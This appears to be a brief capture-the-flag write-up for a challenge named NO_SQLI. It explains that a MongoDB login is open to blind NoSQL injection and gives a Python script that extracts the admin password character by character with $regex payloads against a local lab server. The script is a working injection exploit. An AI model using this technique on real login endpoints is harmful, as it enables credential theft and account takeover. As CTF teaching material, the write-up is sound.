# NO_SQLI
## writeup

the app uses mongo db from the source code we see that the flag is the admin password 
the app is vulnerable to blind no sql injection 

here is a script 
```py
import requests
import string

flag=""

u="http://localhost:1330/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.ascii_letters+'0123456789{_}':
        payload='{"username": "admin", "password": {"$regex": "^%s" }}' % ( flag + c)
        r = requests.post(u, data = payload, headers = headers)
        if 'failed' not in r.text:
            print("FLAG = : %s" % (flag+c))
            flag += c
            if c == '}':
                exit()
```
